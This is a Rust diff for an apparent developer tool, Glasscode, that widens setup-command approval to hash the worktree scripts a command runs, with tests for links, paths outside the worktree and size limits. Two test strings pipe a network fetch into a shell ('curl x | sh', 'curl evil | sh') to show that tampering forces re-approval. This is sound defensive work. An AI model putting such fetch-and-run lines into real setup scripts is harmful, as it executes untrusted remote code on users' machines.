@@ -653,31 +653,208 @@ pub fn approval_key(root: &Path) -> String {
     root.to_string_lossy().into_owned()
 }
 
-/// What is kept of an approved command: its SHA-256, in hex.
-pub fn fingerprint(command: &str) -> String {
-    Sha256::digest(command.as_bytes())
-        .iter()
-        .map(|b| format!("{b:02x}"))
-        .collect()
+/// The most files of the worktree a setup's approval covers, and the largest one it reads.
+pub const SETUP_FILES_MAX: usize = 8;
+pub const SETUP_FILE_BYTES_MAX: u64 = 1024 * 1024;
+
+fn hex(bytes: &[u8]) -> String {
+    bytes.iter().map(|b| format!("{b:02x}")).collect()
+}
+
+/// A file of the new worktree that the setup command names, and the SHA-256 of its content.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SetupFile {
+    /// From the worktree's root, with `/`.
+    pub path: String,
+    pub sha256: String,
+}
+
+/// What an approval covers: the command, and the files of the worktree that it names (a script
+/// it runs). Files that those call in turn are not looked at.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct SetupCheck {
+    pub command: String,
+    pub files: Vec<SetupFile>,
+    /// Words that name a file Glasscode does not read, and why (a link, outside the worktree,
+    /// too large, more than `SETUP_FILES_MAX`).
+    pub not_checked: Vec<(String, &'static str)>,
+}
+
+impl SetupCheck {
+    /// What is kept of an approval: a SHA-256 of the command, each file's path and content hash,
+    /// and the words that were not checked. An approval from before files were covered (the
+    /// command alone) never matches, so it asks once more.
+    pub fn fingerprint(&self) -> String {
+        let mut hash = Sha256::new();
+        hash.update(b"glasscode-setup-2\0");
+        hash.update(self.command.as_bytes());
+        for f in &self.files {
+            hash.update(b"\0file\0");
+            hash.update(f.path.as_bytes());
+            hash.update(b"\0");
+            hash.update(f.sha256.as_bytes());
+        }
+        for (word, why) in &self.not_checked {
+            hash.update(b"\0unchecked\0");
+            hash.update(word.as_bytes());
+            hash.update(b"\0");
+            hash.update(why.as_bytes());
+        }
+        hex(&hash.finalize())
+    }
+}
+
+/// The words of a command as a shell splits them, roughly: spaces separate words, quotes keep
+/// a word together, and `;`, `|`, `&`, `<`, `>`, `(` and `)` end one. A backslash stays a
+/// character (a Windows path has them).
+pub fn setup_words(command: &str) -> Vec<String> {
+    let mut words = Vec::new();
+    let mut word = String::new();
+    let mut quote: Option<char> = None;
+    for c in command.chars() {
+        match quote {
+            Some(q) if c == q => quote = None,
+            Some(_) => word.push(c),
+            None if c == '"' || c == '\'' => quote = Some(c),
+            None if c.is_whitespace() || ";|&<>()".contains(c) => {
+                if !word.is_empty() {
+                    words.push(std::mem::take(&mut word));
+                }
+            }
+            None => word.push(c),
+        }
+    }
+    if !word.is_empty() {
+        words.push(word);
+    }
+    words
+}
+
+/// Read what a setup's approval covers in the worktree at `root`: each word of the command that,
+/// as a path from the root (also after `./` or `.\`), is a regular file inside it. A path through
+/// a link, or one that leaves the worktree, is not followed; at most `SETUP_FILES_MAX` files of
+/// `SETUP_FILE_BYTES_MAX` each are read. It reads files: call it in the background.
+pub fn check_setup(root: &Path, command: &str) -> SetupCheck {
+    let mut check = SetupCheck {
+        command: command.to_string(),
+        ..SetupCheck::default()
+    };
+    let real_root = root.canonicalize().ok();
+    for word in setup_words(command) {
+        let rel = word
+            .strip_prefix("./")
+            .or_else(|| word.strip_prefix(".\\"))
+            .unwrap_or(&word);
+        let shown = rel.replace('\\', "/");
+        if check.files.iter().any(|f| f.path == shown)
+            || check.not_checked.iter().any(|(w, _)| *w == shown)
+        {
+            continue;
+        }
+        let path = Path::new(rel);
+        // A path that leaves the worktree (absolute, a drive, `..`) is not followed; one that
+        // does not exist at all is not a file the command runs.
+        let inside = path.components().next().is_some()
+            && path.components().all(|c| matches!(c, Component::Normal(_)));
+        if !inside {
+            let named = if path.has_root() || path.is_absolute() {
+                path.to_path_buf()
+            } else {
+                root.join(path)
+            };
+            if named.is_file() {
+                check.not_checked.push((shown, "outside the worktree"));
+            }
+            continue;
+        }
+        match file_below(root, path) {
+            Below::NotAFile => {}
+            Below::Link => check.not_checked.push((shown, "a link")),
+            Below::File(full) => {
+                let real = full.canonicalize().ok();
+                let outside = match (&real, &real_root) {
+                    (Some(real), Some(root)) => !real.starts_with(root),
+                    _ => true,
+                };
+                if outside {
+                    check.not_checked.push((shown, "outside the worktree"));
+                } else if check.files.len() == SETUP_FILES_MAX {
+                    check
+                        .not_checked
+                        .push((shown, "more files than are checked"));
+                } else {
+                    match read_capped(&full) {
+                        Some(bytes) => check.files.push(SetupFile {
+                            path: shown,
+                            sha256: hex(&Sha256::digest(&bytes)),
+                        }),
+                        None => check
+                            .not_checked
+                            .push((shown, "larger than 1 MB, or unreadable")),
+                    }
+                }
+            }
+        }
+    }
+    check
+}
+
+enum Below {
+    NotAFile,
+    Link,
+    File(PathBuf),
+}
+
+/// `rel` below `root`, each part looked at without following it.
+fn file_below(root: &Path, rel: &Path) -> Below {
+    let mut at = root.to_path_buf();
+    let parts: Vec<_> = rel.components().collect();
+    for (i, part) in parts.iter().enumerate() {
+        at.push(part);
+        let Ok(meta) = std::fs::symlink_metadata(&at) else {
+            return Below::NotAFile;
+        };
+        if crate::sys::is_link(&meta) {
+            return Below::Link;
+        }
+        let last = i + 1 == parts.len();
+        if (!last && !meta.is_dir()) || (last && !meta.is_file()) {
+            return Below::NotAFile;
+        }
+    }
+    Below::File(at)
+}
+
+/// A file's bytes, when it has at most `SETUP_FILE_BYTES_MAX`.
+fn read_capped(path: &Path) -> Option<Vec<u8>> {
+    let mut bytes = Vec::new();
+    std::fs::File::open(path)
+        .ok()?
+        .take(SETUP_FILE_BYTES_MAX + 1)
+        .read_to_end(&mut bytes)
+        .ok()?;
+    (bytes.len() as u64 <= SETUP_FILE_BYTES_MAX).then_some(bytes)
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum Decision {
-    /// This exact command was approved: it runs.
+    /// This exact command and these files were approved: it runs.
     Run,
-    /// Ask first. `changed`: a different command was approved before.
+    /// Ask first. `changed`: something else was approved before (another command, another
+    /// content of a file it runs, or an approval from before files were covered).
     Ask { changed: bool },
     /// "Never for this project".
     Never,
 }
 
-pub fn decide(approval: Option<&SetupApproval>, command: &str) -> Decision {
+/// The answer for a setup whose check gave `fingerprint` (`SetupCheck::fingerprint`).
+pub fn decide(approval: Option<&SetupApproval>, fingerprint: &str) -> Decision {
     match approval {
         Some(a) if a.never => Decision::Never,
         Some(SetupApproval {
             approved: Some(hash),
             ..
-        }) if *hash == fingerprint(command) => Decision::Run,
+        }) if hash == fingerprint => Decision::Run,
         Some(SetupApproval {
             approved: Some(_), ..
         }) => Decision::Ask { changed: true },
@@ -685,9 +862,10 @@ pub fn decide(approval: Option<&SetupApproval>, command: &str) -> Decision {
     }
 }
 
-pub fn approved(command: &str) -> SetupApproval {
+/// The approval of the setup whose check gave `fingerprint`.
+pub fn approved(fingerprint: &str) -> SetupApproval {
     SetupApproval {
-        approved: Some(fingerprint(command)),
+        approved: Some(fingerprint.to_string()),
         never: false,
     }
 }
@@ -1342,32 +1520,196 @@ mod tests {
         );
     }
 
+    fn fp(command: &str) -> String {
+        SetupCheck {
+            command: command.into(),
+            ..SetupCheck::default()
+        }
+        .fingerprint()
+    }
+
     #[test]
     fn a_changed_setup_asks_again() {
         let cmd = "pnpm install";
-        assert_eq!(decide(None, cmd), Decision::Ask { changed: false });
-        let ok = approved(cmd);
-        assert_eq!(decide(Some(&ok), cmd), Decision::Run);
+        assert_eq!(decide(None, &fp(cmd)), Decision::Ask { changed: false });
+        let ok = approved(&fp(cmd));
+        assert_eq!(decide(Some(&ok), &fp(cmd)), Decision::Run);
         assert_eq!(
-            decide(Some(&ok), "pnpm install && curl x | sh"),
+            decide(Some(&ok), &fp("pnpm install && curl x | sh")),
             Decision::Ask { changed: true }
         );
         assert_eq!(
-            decide(Some(&ok), "pnpm install "),
+            decide(Some(&ok), &fp("pnpm install ")),
             Decision::Ask { changed: true },
             "the exact text"
         );
-        assert_eq!(decide(Some(&never()), cmd), Decision::Never);
+        assert_eq!(decide(Some(&never()), &fp(cmd)), Decision::Never);
         assert_eq!(
-            decide(Some(&SetupApproval::default()), cmd),
+            decide(Some(&SetupApproval::default()), &fp(cmd)),
             Decision::Ask { changed: false }
         );
-        assert_eq!(fingerprint("echo setup ran").len(), 64);
-        assert_ne!(fingerprint("a"), fingerprint("b"));
+        assert_eq!(fp("echo setup ran").len(), 64);
+        assert_ne!(fp("a"), fp("b"));
         assert!(
             ok.approved.as_deref().is_some_and(|h| !h.contains(cmd)),
             "only a hash is kept"
         );
+        // An approval from before files were covered (a SHA-256 of the command alone) asks once
+        // more.
+        let old = SetupApproval {
+            approved: Some(hex(&Sha256::digest(cmd.as_bytes()))),
+            never: false,
+        };
+        assert_eq!(
+            decide(Some(&old), &fp(cmd)),
+            Decision::Ask { changed: true }
+        );
+    }
+
+    #[test]
+    fn the_words_of_a_command() {
+        assert_eq!(
+            setup_words(
+                r#"bash ./script/setup.sh && pwsh -File ".\my tools\a.ps1";cat x|grep 'y z'>out"#
+            ),
+            [
+                "bash",
+                "./script/setup.sh",
+                "pwsh",
+                "-File",
+                ".\\my tools\\a.ps1",
+                "cat",
+                "x",
+                "grep",
+                "y z",
+                "out"
+            ]
+        );
+        assert!(setup_words("   ").is_empty());
+    }
+
+    /// The approval covers the scripts that the command runs from the worktree.
+    #[test]
+    fn a_changed_script_asks_again_and_an_unchanged_one_runs() {
+        let wt = tempfile::tempdir().unwrap();
+        let root = wt.path();
+        std::fs::create_dir_all(root.join("script")).unwrap();
+        std::fs::create_dir_all(root.join("my tools")).unwrap();
+        std::fs::write(root.join("script").join("setup.sh"), "pnpm install\n").unwrap();
+        std::fs::write(root.join("my tools").join("a.ps1"), "Write-Host hi\n").unwrap();
+        let cmd = r#"sh ./script/setup.sh && pwsh -File ".\my tools\a.ps1" && echo install"#;
+        let first = check_setup(root, cmd);
+        assert_eq!(
+            first
+                .files
+                .iter()
+                .map(|f| f.path.as_str())
+                .collect::<Vec<_>>(),
+            ["script/setup.sh", "my tools/a.ps1"]
+        );
+        assert!(first.not_checked.is_empty(), "{:?}", first.not_checked);
+        let ok = approved(&first.fingerprint());
+        // Unchanged: it runs.
+        assert_eq!(
+            decide(Some(&ok), &check_setup(root, cmd).fingerprint()),
+            Decision::Run
+        );
+        // A word that is not a file changes nothing (`install` and `echo` are not files here).
+        std::fs::create_dir(root.join("echo")).unwrap();
+        assert_eq!(
+            decide(Some(&ok), &check_setup(root, cmd).fingerprint()),
+            Decision::Run,
+            "a folder is not a file"
+        );
+        // The script changes (a later pull): ask again.
+        std::fs::write(
+            root.join("script").join("setup.sh"),
+            "pnpm install\ncurl evil | sh\n",
+        )
+        .unwrap();
+        assert_eq!(
+            decide(Some(&ok), &check_setup(root, cmd).fingerprint()),
+            Decision::Ask { changed: true }
+        );
+    }
+
+    #[test]
+    fn a_link_or_a_path_outside_the_worktree_is_not_followed() {
+        let home = tempfile::tempdir().unwrap();
+        let root = home.path().join("wt");
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::write(home.path().join("outside.sh"), "echo out\n").unwrap();
+        let outside = home.path().join("outside.sh");
+        let cmd = format!("sh ../outside.sh && sh {}", outside.display());
+        let check = check_setup(&root, &cmd);
+        assert!(check.files.is_empty());
+        assert_eq!(check.not_checked.len(), 2, "{:?}", check.not_checked);
+        assert!(
+            check
+                .not_checked
+                .iter()
+                .all(|(_, why)| *why == "outside the worktree")
+        );
+        // A junction (Windows) or a symbolic link (Unix) inside the worktree to a folder outside.
+        let target = home.path().join("tools");
+        std::fs::create_dir_all(&target).unwrap();
+        std::fs::write(target.join("run.sh"), "echo run\n").unwrap();
+        let link = root.join("tools");
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(&target, &link).unwrap();
+        #[cfg(windows)]
+        {
+            let out = crate::sys::command("cmd")
+                .arg("/c")
+                .arg("mklink")
+                .arg("/J")
+                .arg(&link)
+                .arg(&target)
+                .output()
+                .unwrap();
+            assert!(
+                out.status.success(),
+                "mklink /J: {}",
+                String::from_utf8_lossy(&out.stdout)
+            );
+        }
+        let check = check_setup(&root, "sh tools/run.sh");
+        assert!(check.files.is_empty());
+        assert_eq!(
+            check.not_checked,
+            vec![("tools/run.sh".to_string(), "a link")]
+        );
+    }
+
+    #[test]
+    fn the_files_an_approval_covers_have_limits() {
+        let wt = tempfile::tempdir().unwrap();
+        let root = wt.path();
+        let mut cmd = String::new();
+        for i in 0..SETUP_FILES_MAX + 2 {
+            std::fs::write(root.join(format!("s{i}.sh")), format!("echo {i}\n")).unwrap();
+            cmd.push_str(&format!("sh s{i}.sh; "));
+        }
+        let big = vec![b'x'; SETUP_FILE_BYTES_MAX as usize + 1];
+        std::fs::write(root.join("big.sh"), &big).unwrap();
+        cmd.push_str("sh big.sh");
+        let check = check_setup(root, &cmd);
+        assert_eq!(check.files.len(), SETUP_FILES_MAX);
+        // The two scripts past the limit, and big.sh after them, are named as not checked.
+        let past: Vec<&str> = check
+            .not_checked
+            .iter()
+            .filter(|(_, why)| *why == "more files than are checked")
+            .map(|(w, _)| w.as_str())
+            .collect();
+        assert_eq!(past, ["s8.sh", "s9.sh", "big.sh"]);
+        // A big file alone is not read, and says so.
+        let alone = check_setup(root, "sh big.sh");
+        assert_eq!(
+            alone.not_checked,
+            vec![("big.sh".to_string(), "larger than 1 MB, or unreadable")]
+        );
+        assert!(alone.files.is_empty());
     }
 
     #[test]
